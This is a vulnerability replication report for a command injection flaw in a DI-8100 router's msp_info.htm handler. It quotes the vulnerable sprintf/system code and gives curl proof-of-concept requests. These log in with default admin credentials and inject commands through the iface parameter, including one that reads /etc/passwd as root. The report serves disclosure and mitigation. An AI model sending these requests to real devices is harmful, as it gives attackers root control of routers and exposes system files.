### Vulnerability Replication Report

**Vulnerability ID:** VDB-001  
**Title:** DI-8100 Router `msp_info_htm` Command Injection  
**Date:** 2026-03-26  
**Status:** Verified  

---

#### 1. Summary
A command injection vulnerability exists in the `/msp_info.htm` CGI handler of the DI-8100 router. An authenticated attacker can inject arbitrary operating system commands via the `iface` parameter when the `flag` parameter is set to `qos`. The vulnerability allows remote code execution with root privileges.

---

#### 2. Affected Product
- **Vendor:** D-Link (assumed) / DI-8100 router
- **Hardware:** DI-8100
- **Firmware:** Version unknown (tested on default firmware)
- **Component:** `msp_info_htm` CGI module

---

#### 3. Vulnerability Details
The function `msp_info_htm` (located in `msp_info_htm@0044d74c.c`) processes HTTP requests and constructs system commands based on user-supplied parameters. When the `flag` parameter equals `qos`, the code retrieves the `iface` parameter using `httpd_get_parm()` and concatenates it into a command string using `sprintf()`:

```c
sprintf(wys_qos_devinfo____tmp_msp.info_, "wys qos skb %s > /tmp/msp.info", parm_1);
system(wys_qos_devinfo____tmp_msp.info_);
```

No sanitization or validation is performed on `parm_1` (the `iface` value). An attacker can inject shell metacharacters such as `;`, `|`, or `&` to terminate the original command and execute arbitrary commands.

---

#### 4. Proof of Concept (PoC)
The following steps demonstrate exploitation using `curl`. The attacker must first obtain a valid session cookie.

**4.1 Login**
```bash
curl -c cookies.txt -X POST "http://192.168.0.1/login.cgi" \
  -d "user=admin&password=admin"
```

**4.2 Command Injection**
Execute `ls /` to list the root directory:
```bash
curl -b cookies.txt "http://192.168.0.1/msp_info.htm?flag=qos&iface=x;ls%20/"
```

**4.3 Verify Root Privileges**
```bash
curl -b cookies.txt "http://192.168.0.1/msp_info.htm?flag=qos&iface=x;whoami"
```
Expected output: `root`

**4.4 Read Sensitive File**
```bash
curl -b cookies.txt "http://192.168.0.1/msp_info.htm?flag=qos&iface=x;cat%20/etc/passwd"
```

All injected commands execute successfully, confirming the vulnerability.

---

#### 5. Impact
- **Confidentiality:** High – attacker can read arbitrary files (e.g., `/etc/passwd`, configuration).
- **Integrity:** High – attacker can modify system configuration or install backdoors.
- **Availability:** High – attacker can disrupt device operation.
- **Access Vector:** Network – requires valid administrative credentials.

---

#### 6. CVSS Score (v3.1)
- **Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
- **Base Score:** 9.9 (Critical)

---

#### 7. Mitigation
- **Firmware Update:** Apply the latest vendor patch when available.
- **Input Validation:** Implement a whitelist for the `iface` parameter (e.g., only allow `eth0`, `br0`).
- **Secure Coding:** Replace `system()` with safer alternatives such as `execve()` with argument arrays.
- **Workaround:** Restrict management interface access via firewall rules and change default administrative credentials.

---

#### 8. References
- CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
- OWASP Command Injection Prevention Cheat Sheet
